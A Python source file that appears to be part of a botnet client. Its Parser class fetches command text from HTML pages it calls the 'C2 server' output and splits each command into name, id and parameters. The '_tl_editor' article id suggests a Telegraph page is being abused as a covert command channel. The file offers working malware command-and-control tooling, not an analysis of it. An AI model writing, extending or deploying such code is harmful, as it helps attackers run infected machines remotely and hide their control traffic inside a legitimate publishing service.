from bs4 import BeautifulSoup
from requests import Response
from bots.Cryptographic import Cryptographic

# Handle all parsings
class Parser:
    def __init__(self, crypt: Cryptographic):
        self.crypt = crypt

    # Parse the HTML content from the C2 server, extract the command text, and return it as a clean string
    def __parse_html(self, html: Response):
        soup = BeautifulSoup(html.text, "html.parser")
        article = soup.find("article", id="_tl_editor")

        # Handle error if article is not found
        if not article:
            return None
    
        # Remove title from command
        article.find("h1").decompose() if article.find("h1") else None

        # TODO: Decrypt if needed

        # Get clean text content, strip whitespace
        command = article.get_text(separator="\n").strip()  
        return command

    # Parse the command received from the C2 server, return a tuple containing the command, id, and parameters
    def parse_command(self, to_parse: str):
        # cmd_str = self.__parse_html(to_parse)

        try:
            parts = to_parse.split(":")
            cmd = parts[0]
            id = parts[1] if len(parts) > 1 else None
            params = parts[2:] if len(parts) > 2 else []
            return (cmd, id, params)
        except Exception as e:
            print(f"Error parsing command: {e}")
            return (None, None, None)